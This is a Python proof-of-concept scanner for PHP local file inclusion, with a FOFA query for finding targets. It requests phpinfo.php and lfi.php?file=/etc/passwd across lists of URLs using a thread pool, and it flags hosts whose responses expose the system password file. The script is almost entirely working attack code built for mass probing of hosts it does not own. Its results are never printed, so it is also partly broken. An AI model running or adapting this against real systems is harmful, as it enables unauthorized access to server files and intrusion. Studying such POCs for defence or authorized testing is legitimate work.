#FOFA: body=".php"

import urllib
from urllib import request
from urllib.parse import urlparse
import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool
import random
import string

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    relsult = {
        'name': 'PHP文件包含漏洞(利用phpinfo)',
        'vulnerable': False,
        'attack': True,
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    }
    try:
        vurl1 = urllib.parse.urljoin(target, 'phpinfo.php')
        vurl2 = urllib.parse.urljoin(target, 'lfi.php?file=/etc/passwd')
        rep1 = requests.get(vurl1, headers=headers, timeout=3)
        rep2 = requests.get(vurl2, headers=headers, timeout=3)
        if re.search('PHP Version', rep1.text) and re.search('root:x', rep2.text):
            relsult['vulnerable'] = True
            relsult['url'] = target
            relsult['method'] = 'GET'
            relsult['payload'] = vurl2
        return relsult
    except:
        return relsult

def main():
    parser = argparse.ArgumentParser("PHP文件包含漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()